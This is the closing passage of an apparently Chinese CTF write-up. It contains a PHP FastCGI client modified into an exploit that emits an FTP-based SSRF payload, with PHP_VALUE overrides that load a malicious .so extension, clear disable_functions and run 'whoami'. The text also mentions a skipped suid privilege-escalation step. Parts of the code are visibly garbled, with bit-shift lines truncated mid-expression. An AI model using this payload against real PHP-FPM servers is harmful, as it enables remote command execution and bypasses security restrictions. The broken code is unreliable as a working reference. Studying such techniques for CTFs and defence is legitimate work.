        }
        /**
         * Get the keep alive status
         *
         * @return Boolean true if the connection should stay alive, false otherwise
         */
        public function getKeepAlive()
        {
            return $this->_keepAlive;
        }
        /**
         * Create a connection to the FastCGI application
         */
        private function connect()
        {
            if (!$this->_sock) {
                //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
                $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
                if (!$this->_sock) {
                    throw new Exception('Unable to connect to FastCGI application');
                }
            }
        }
        /**
         * Build a FastCGI packet
         *
         * @param Integer $type Type of the packet
         * @param String $content Content of the packet
         * @param Integer $requestId RequestId
         */
        private function buildPacket($type, $content, $requestId = 1)
        {
            $clen = strlen($content);
            return chr(self::VERSION_1)         /* version */
                . chr($type)                    /* type */
                . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
                . chr($requestId & 0xFF)        /* requestIdB0 */
                . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
                . chr($clen & 0xFF)             /* contentLengthB0 */
                . chr(0)                        /* paddingLength */
                . chr(0)                        /* reserved */
                . $content;                     /* content */
        }
        /**
         * Build an FastCGI Name value pair
         *
         * @param String $name Name
         * @param String $value Value
         * @return String FastCGI Name value pair
         */
        private function buildNvpair($name, $value)
        {
            $nlen = strlen($name);
            $vlen = strlen($value);
            if ($nlen > 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
            }
            if ($vlen > 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
            }
            /* nameData & valueData */
            return $nvpair . $name . $value;
        }
        /**
         * Read a set of FastCGI Name value pairs
         *
         * @param String $data Data containing the set of FastCGI NVPair
         * @return array of NVPair
         */
        private function readNvpair($data, $length = null)
        {
            $array = array();
            if ($length === null) {
                $length = strlen($data);
            }
            $p = 0;
            while ($p != $length) {
                $nlen = ord($data{$p++});
                if ($nlen >= 128) {
                    $nlen = ($nlen & 0x7F = 128) {
                    $vlen = ($nlen & 0x7F _sock, self::HEADER_LEN)) {
                $resp = $this->decodePacketHeader($packet);
                $resp['content'] = '';
                if ($resp['contentLength']) {
                    $len  = $resp['contentLength'];
                    while ($len && $buf=fread($this->_sock, $len)) {
                        $len -= strlen($buf);
                        $resp['content'] .= $buf;
                    }
                }
                if ($resp['paddingLength']) {
                    $buf=fread($this->_sock, $resp['paddingLength']);
                }
                return $resp;
            } else {
                return false;
            }
        }
        /**
         * Get Informations on the FastCGI application
         *
         * @param array $requestedInfo information to retrieve
         * @return array
         */
        public function getValues(array $requestedInfo)
        {
            $this->connect();
            $request = '';
            foreach ($requestedInfo as $info) {
                $request .= $this->buildNvpair($info, '');
            }
            fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
            $resp = $this->readPacket();
            if ($resp['type'] == self::GET_VALUES_RESULT) {
                return $this->readNvpair($resp['content'], $resp['length']);
            } else {
                throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
            }
        }
        /**
         * Execute a request to the FastCGI application
         *
         * @param array $params Array of parameters
         * @param String $stdin Content
         * @return String
         */
        public function request(array $params, $stdin)
        {
            $response = '';
    //        $this->connect();
            $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
            $paramsRequest = '';
            foreach ($params as $key => $value) {
                $paramsRequest .= $this->buildNvpair($key, $value);
            }
            if ($paramsRequest) {
                $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
            }
            $request .= $this->buildPacket(self::PARAMS, '');
            if ($stdin) {
                $request .= $this->buildPacket(self::STDIN, $stdin);
            }
            $request .= $this->buildPacket(self::STDIN, '');
            echo('?file=ftp://ip:9999&data='.urlencode($request));
    //        fwrite($this->_sock, $request);
    //        do {
    //            $resp = $this->readPacket();
    //            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
    //                $response .= $resp['content'];
    //            }
    //        } while ($resp && $resp['type'] != self::END_REQUEST);
    //        var_dump($resp);
    //        if (!is_array($resp)) {
    //            throw new Exception('Bad request');
    //        }
    //        switch (ord($resp['content']{4})) {
    //            case self::CANT_MPX_CONN:
    //                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
    //                break;
    //            case self::OVERLOADED:
    //                throw new Exception('New request rejected; too busy [OVERLOADED]');
    //                break;
    //            case self::UNKNOWN_ROLE:
    //                throw new Exception('Role value not known [UNKNOWN_ROLE]');
    //                break;
    //            case self::REQUEST_COMPLETE:
    //                return $response;
    //        }
        }
    }
    ?>
    "; // php payload -- Doesnt do anything
    $php_value = "unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = ";
    $params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command=whoami',
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
    #'DOCUMENT_ROOT'     => '/',
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => '80sec/wofeiwo',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9001',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
    );
    // print_r($_REQUEST);
* * *
    // print_r($params);
    //echo "Call: $uri\n\n";
    echo $client->request($params, $code)."\n";
    ?>
这是普通的方式，但是在这里我们会发现这个方法他不行了，不难正常了打完。但是，我们在读取`php.ini`的时候发现了一个so文件,我们就可以通过加载恶意so文件来绕过。
看一下上面的脚本也就知道怎么操作了。
下面还有个suid提权不说了，收工了，困。
## 0x03 总结与参考链接
> 
>
> 
>
> 
>
> 